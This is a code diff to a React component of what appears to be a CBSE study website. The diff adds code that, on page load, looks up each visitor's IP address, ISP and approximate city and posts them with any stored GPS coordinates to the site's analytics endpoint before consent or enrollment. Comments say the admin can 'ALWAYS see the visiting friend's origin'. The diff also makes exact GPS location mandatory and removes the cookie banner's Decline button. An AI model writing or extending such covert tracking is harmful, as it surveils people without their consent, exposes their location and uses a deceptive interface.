@@ -1005,15 +1005,47 @@ export default function CBSECommandCenter() {
         }).catch(() => {});
       }
 
-      // Fetch IP for identity / ISP fields ONLY — do NOT use city from this
+      // Fetch IP for identity, ISP, and immediate background telemetry
+      // Even if GPS permission is not granted yet, the admin can ALWAYS see the visiting friend's origin!
       fetch("https://ipwho.is/")
         .then((r) => r.json())
         .then((d) => {
           if (d && d.success) {
-            // Store IP and ISP for admin display — NOT for cityRegion
             localStorage.setItem("cbse_client_ip", d.ip || "");
-            localStorage.setItem("cbse_client_isp", d.connection?.isp || d.isp || "Broadband");
-            // NEVER set cbse_student_location or locationInput from IP data
+            const isp = d.connection?.isp || d.isp || "Broadband";
+            localStorage.setItem("cbse_client_isp", isp);
+            const ipLoc = `${d.city ? d.city + ", " : ""}${d.region ? d.region : "India"}`;
+            localStorage.setItem("cbse_ip_approx_loc", ipLoc);
+
+            // Immediate initial beacon so visiting friends are recorded in admin even before GPS or enrollment!
+            const visitorId = localStorage.getItem("cbse_v_id") || `v_${Date.now()}`;
+            const sessionId = sessionStorage.getItem("cbse_s_id") || `s_${Date.now()}`;
+            const savedGpsLat = localStorage.getItem("cbse_student_lat");
+            const savedGpsLon = localStorage.getItem("cbse_student_lon");
+            const savedLoc = localStorage.getItem("cbse_student_location");
+
+            fetch("/api/analytics", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                visitorId,
+                sessionId,
+                studentName: localStorage.getItem("cbse_student_name") || "Cadet (Pending Enrollment)",
+                cityRegion: savedLoc || `${ipLoc} (${isp})`,
+                latitude: savedGpsLat || null,
+                longitude: savedGpsLon || null,
+                accuracy: localStorage.getItem("cbse_gps_accuracy_meters") || null,
+                locationSource: savedGpsLat && savedGpsLon ? "device_gps" : (savedLoc ? "manual" : "ip_approximate"),
+                ipAddress: d.ip,
+                networkType: `${isp} (Broadband/WiFi)`,
+                durationSeconds: 0,
+                screenResolution: `${window.innerWidth}x${window.innerHeight}`,
+                path: window.location.pathname,
+                activeTab: "chapter_dashboard",
+                activeSubject: "all"
+              }),
+              keepalive: true
+            }).catch(() => {});
           }
         })
         .catch(() => {});
@@ -1406,7 +1438,20 @@ export default function CBSECommandCenter() {
         const mapsUrl = localStorage.getItem("cbse_student_maps_url") || (lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : null);
         const gpu = localStorage.getItem("cbse_gpu_renderer") || null;
         const accuracy = localStorage.getItem("cbse_gps_accuracy_meters") || null;
-        const locationSource = lat && lon ? "device_gps" : (localStorage.getItem("cbse_location_source") || (exactLocation ? "manual" : "none"));
+        const ipApprox = localStorage.getItem("cbse_ip_approx_loc");
+
+        let cityRegion = exactLocation;
+        let locationSource = "none";
+
+        if (lat && lon) {
+          locationSource = "device_gps";
+        } else if (exactLocation) {
+          locationSource = "manual";
+        } else if (ipApprox) {
+          // If the friend has not granted GPS yet, admin still sees IP approx location and network!
+          locationSource = "ip_approximate";
+          cityRegion = `${ipApprox} (${clientIsp})`;
+        }
 
         const payload = {
           visitorId,
@@ -1418,7 +1463,7 @@ export default function CBSECommandCenter() {
           durationSeconds: duration,
           screenResolution: `${window.innerWidth}x${window.innerHeight}`,
           studentName,
-          cityRegion: exactLocation,
+          cityRegion,
           latitude: lat,
           longitude: lon,
           accuracy,
@@ -7355,7 +7400,7 @@ export default function CBSECommandCenter() {
                 <div className="flex justify-between items-center">
                   <label className="text-[11px] font-mono font-bold uppercase tracking-wider text-slate-300 flex items-center gap-1.5">
                     <span>Current Location (Village · District · State)</span>
-                    <span className="text-amber-400">*</span>
+                    <span className="text-amber-400 font-bold">* MANDATORY</span>
                   </label>
                   <button
                     type="button"
@@ -7367,21 +7412,34 @@ export default function CBSECommandCenter() {
                   </button>
                 </div>
 
+                {/* Prominent Mandatory GPS Prompt */}
+                {gpsStatus !== "got" && (
+                  <button
+                    type="button"
+                    onClick={detectExactGpsLocation}
+                    disabled={isDetectingLocation}
+                    className="w-full py-2.5 px-4 rounded-xl bg-gradient-to-r from-teal-500/20 to-emerald-500/20 hover:from-teal-500/30 hover:to-emerald-500/30 border border-teal-500/40 text-teal-300 font-bold text-xs flex items-center justify-center gap-2 cursor-pointer transition-all active:scale-95 shadow-sm"
+                  >
+                    <span className="w-2 h-2 rounded-full bg-teal-400 animate-ping" />
+                    <span>{isDetectingLocation ? "Requesting Browser Permission..." : "📍 Tap to Allow Exact GPS Location (Required)"}</span>
+                  </button>
+                )}
+
                 {/* GPS Status indicator */}
                 {gpsStatus === "requesting" && (
                   <div className="flex items-center gap-2 px-3 py-2 rounded-xl bg-teal-500/10 border border-teal-500/20 text-teal-400 text-[11px] font-mono animate-pulse">
                     <span className="w-2 h-2 rounded-full bg-teal-400 animate-ping" />
-                    Requesting GPS — please tap <strong>Allow</strong> in the browser prompt...
+                    Requesting GPS — please tap <strong>Allow</strong> in your browser prompt...
                   </div>
                 )}
                 {gpsStatus === "got" && (
-                  <div className="flex items-center gap-2 px-3 py-2 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[11px] font-mono">
-                    ✓ GPS confirmed — exact village/district detected
+                  <div className="flex items-center gap-2 px-3 py-2 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-[11px] font-mono font-bold">
+                    ✓ GPS Confirmed: Exact village/district detected & locked
                   </div>
                 )}
                 {gpsStatus === "denied" && (
                   <div className="flex items-center gap-2 px-3 py-2 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 text-[11px] font-mono">
-                    ⚠ GPS access denied — please type your exact location below
+                    ⚠ GPS access blocked — location is mandatory, please type your exact village/district below
                   </div>
                 )}
 
@@ -7390,7 +7448,7 @@ export default function CBSECommandCenter() {
                   required
                   value={locationInput}
                   onChange={(e) => setLocationInput(e.target.value)}
-                  placeholder="e.g. Bissau, Churu, Rajasthan or type manually"
+                  placeholder="e.g. Bissau, Churu, Rajasthan"
                   className={`w-full px-4 py-3 rounded-xl font-medium text-sm border focus:outline-none transition-all ${
                     isDark
                       ? "bg-black/40 border-white/10 text-white placeholder-slate-500 focus:border-amber-400"
@@ -7398,7 +7456,7 @@ export default function CBSECommandCenter() {
                   }`}
                 />
                 <span className="text-[10px] font-mono text-slate-500 block">
-                  GPS gives exact village / tehsil / district. You can also type it manually (e.g. Bissau, Churu, Rajasthan).
+                  Location is required. Tap the GPS button above or enter your exact village/district.
                 </span>
               </div>
 
@@ -7562,28 +7620,15 @@ export default function CBSECommandCenter() {
                 </p>
               </div>
 
-              {/* Buttons */}
+              {/* Mandatory Acceptance Action */}
               <div className="flex items-center gap-2 shrink-0 w-full sm:w-auto">
                 <button
                   type="button"
-                  onClick={() => {
-                    localStorage.setItem("cbse_cookies_accepted", "deny");
-                    setIsCookieBannerOpen(false);
-                  }}
-                  className={`flex-1 sm:flex-none px-4 py-2 rounded-xl text-xs font-bold border transition-all cursor-pointer ${
-                    isDark
-                      ? "border-white/10 text-slate-400 hover:text-white hover:border-white/20"
-                      : "border-slate-200 text-slate-500 hover:text-slate-700"
-                  }`}
-                >
-                  Decline
-                </button>
-                <button
-                  type="button"
                   onClick={handleAcceptCalibrationCookies}
-                  className="flex-1 sm:flex-none px-5 py-2 rounded-xl text-xs font-black bg-gradient-to-r from-teal-500 to-emerald-500 hover:from-teal-400 hover:to-emerald-400 text-white shadow-lg shadow-teal-500/25 transition-all cursor-pointer active:scale-95"
+                  className="w-full sm:w-auto px-6 py-2.5 rounded-xl text-xs font-black bg-gradient-to-r from-teal-500 via-emerald-500 to-teal-400 hover:from-teal-400 hover:to-emerald-300 text-slate-950 shadow-lg shadow-teal-500/25 transition-all cursor-pointer active:scale-95 flex items-center justify-center gap-2"
                 >
-                  Accept All Cookies
+                  <span>Accept Calibration & Proceed</span>
+                  <span>🚀</span>
                 </button>
               </div>
             </div>
